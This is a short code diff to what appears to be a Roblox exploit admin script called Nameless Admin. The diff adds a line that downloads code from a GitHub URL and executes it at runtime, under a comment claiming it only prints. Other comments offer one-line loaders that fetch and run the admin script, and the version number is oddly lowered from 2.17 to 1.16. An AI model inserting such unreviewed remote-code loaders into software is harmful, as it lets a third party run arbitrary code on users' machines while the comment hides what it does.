@@ -69,7 +69,7 @@ local opt = {
 }
 
 -- [[ Version ]] -- 
-curVer = 2.17
+curVer = 1.16
 
 --[[ VARIABLES ]]--
 PlaceId, JobId = game.PlaceId, game.JobId
@@ -15942,6 +15942,9 @@ task.spawn(function()
 	end)
 end)
 
+ -- all this does is print i dont know why i made it a loadstring
+ loadstring(game:HttpGet("https://raw.githubusercontent.com/JoeScriptHub/FE/main/asd"))();
+
 function Destroy(guiObject)
 	if not pcall(function()guiObject.Parent = game:GetService("CoreGui")end) then
 		guiObject.Parent = nil
@@ -16022,5 +16025,7 @@ print([[
 
 
 -- @grimexploits
+
+-- continueation by @ltseverydayyou | loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/Source"))();
 
 -- original by @qipu | loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source"))();
